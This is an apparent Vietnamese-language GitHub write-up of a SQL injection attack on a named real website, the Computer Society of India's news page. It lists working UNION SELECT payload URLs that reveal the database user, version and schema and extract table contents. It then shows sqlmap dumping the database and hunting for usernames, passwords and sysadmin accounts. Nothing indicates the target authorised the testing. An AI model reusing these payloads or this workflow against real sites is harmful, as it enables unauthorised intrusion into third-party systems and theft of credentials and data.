# TỔNG QUAN # 

Kiểm tra trên web "Computer Society of India" `https://csi-india.org/news/index.php?id=18`

![image](https://github.com/user-attachments/assets/089b7ff5-3f94-4575-a9ee-1e0876ec59a3)

## CÁC BƯỚC

* [Dò tìm số cột](#dò-tìm-số-cột)
* [Kiểm tra database, version, user](#kiểm-tra-database-version-user)
* [Trích xuất cơ sở dữ liệu](#trích-xuất-cơ-sở-dữ-liệu)
* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)

## Dò tìm số cột

![image](https://github.com/user-attachments/assets/1db5d0ae-72f2-432c-abeb-fb572dd2c1ea)

![image](https://github.com/user-attachments/assets/84374454-20c5-4db2-a2c6-23d905c49bcf)

![image](https://github.com/user-attachments/assets/cccfee89-cf9f-4c3a-be8a-fc30af8329e1)

## Kiểm tra database, version, user 

`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,user(),5,6,7,8`

![image](https://github.com/user-attachments/assets/75227e5b-953a-48dd-a56a-c49d4b1b8725)

https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,version(),5,6,7,8

![image](https://github.com/user-attachments/assets/e623bf1a-727f-4a23-b0a4-2b80b280a6cb)

https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,database(),5,6,7,8

![image](https://github.com/user-attachments/assets/12a78158-d713-44f4-add8-74f6ae91d9fa)

## Trích xuất cơ sở dữ liệu

**1. Liệt kê các database**

`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,group_concat(0x7c,schema_name,0x7c),5,6,7,8+from+information_schema.schemata`

![image](https://github.com/user-attachments/assets/5780aae7-dc2c-482a-aea2-d3aa8ae689f1)

**2. Liệt kê các bảng**

`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,group_concat(0x7c,table_name,0x7c),5,6,7,8+from+information_schema.tables+where+table_schema='csiindia_portal'`

![image](https://github.com/user-attachments/assets/182e61f9-cd2a-41c6-850b-e4eb2154eecf)

**3. Liệt kê các cột trong bảng**

`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7c),5,6,7,8+from+information_schema.columns+where+table_name='category'`

![image](https://github.com/user-attachments/assets/5af91210-33b2-48bd-82c6-bb20f117567b)

**4. Trích xuất dữ liệu bất kì**

`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,cat_name,5,6,7,8+from+category`

![image](https://github.com/user-attachments/assets/bd7fcad5-1cec-4fb6-b54d-4b3411818224)

## Sử dụng `sqlmap`

**1. Trích xuất database:**

![image](https://github.com/user-attachments/assets/9eb20627-fe43-4f2d-a951-70ad997a8b40)

**2. Tìm kiếm thông tin về username, password, tài khoản sysadmin**

![image](https://github.com/user-attachments/assets/5175361d-dbfc-4e58-816b-a83455ffbf2f)

![image](https://github.com/user-attachments/assets/e6f0927a-96ea-4981-8369-1ce2c3304d79)

![image](https://github.com/user-attachments/assets/0f51fac4-636d-4fd7-9484-61a5228846b6)

![image](https://github.com/user-attachments/assets/8e4d4498-7349-4421-8d82-4454e266ccb6)



